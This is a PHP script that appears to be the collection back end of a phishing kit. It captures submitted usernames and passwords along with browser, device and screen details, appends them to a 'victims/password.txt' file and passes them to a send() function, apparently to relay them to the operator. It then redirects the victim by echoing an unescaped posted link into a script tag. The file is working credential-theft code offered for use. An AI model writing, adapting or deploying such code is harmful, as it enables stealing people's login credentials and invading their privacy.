<?php
include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{		   
	$user_agent = $_SERVER['HTTP_USER_AGENT'];                                                                //Get User agent
    $data = "username:" .$_POST['username']."\n".                                                             //Append username
            "password:" .$_POST['password']."\n".                                                             //Append password
	    "Page:"     .$_POST['location']."\n";                                                             //Append page
    //$data .= file_get_contents("http://ip-api.com/json");                                                     //Get data
    //$data = str_replace(',',"\n",$data);                                                                      //Replace , with newline
    //$data = str_replace('"','',$data);                                                                        //Remove "
    //$data = str_replace('{','',$data);                                                                        //Remove {
    //$data = str_replace('}','',$data);                                                                        //Remove }
    $data .= "\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                       //Append Screen Size
    $data .= "\nUser Agent:".$user_agent;                                                                //Append User agent
    $data .= "\nOS:".Operating_System($user_agent);                                                      //Append Operating System
    $data .= "\nBrowser:".Browser($user_agent);                                                          //Append Browser
    $data .= "\nDevice:".Device($user_agent);                                                            //Append Device
    $data .= "\n\n";                                     //Append newline
    
    File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                       //Append data to file
    send($data);	
}
echo "<script>window.location.replace('".$_POST['link']."');</script>";
?>
